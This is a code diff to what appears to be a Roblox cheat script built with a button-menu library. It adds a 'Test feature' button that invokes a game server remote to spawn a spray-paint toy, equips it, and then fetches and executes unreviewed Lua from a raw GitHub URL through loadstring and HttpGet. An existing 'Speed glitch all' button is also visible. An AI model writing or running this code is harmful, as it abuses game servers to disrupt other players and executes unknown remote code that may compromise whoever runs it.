@@ -370,6 +370,25 @@ end
 })
 
 Tab:AddButton({
+	Name = "Test feature",
+	Callback = function()
+local args = {
+    [1] = "SprayPaint"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("ReplicateToy"):InvokeServer(unpack(args))
+
+for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+        if v.name == "SprayPaint" then
+            v.Parent = game.Players.LocalPlayer.Character
+    end
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zxclua/TimurkaProLuaCoder228/main/yessssssskimozoncontrol", true))()
+  	end    
+})
+
+Tab:AddButton({
 	Name = "Speed glitch all",
 	Callback = function()
 local args = {
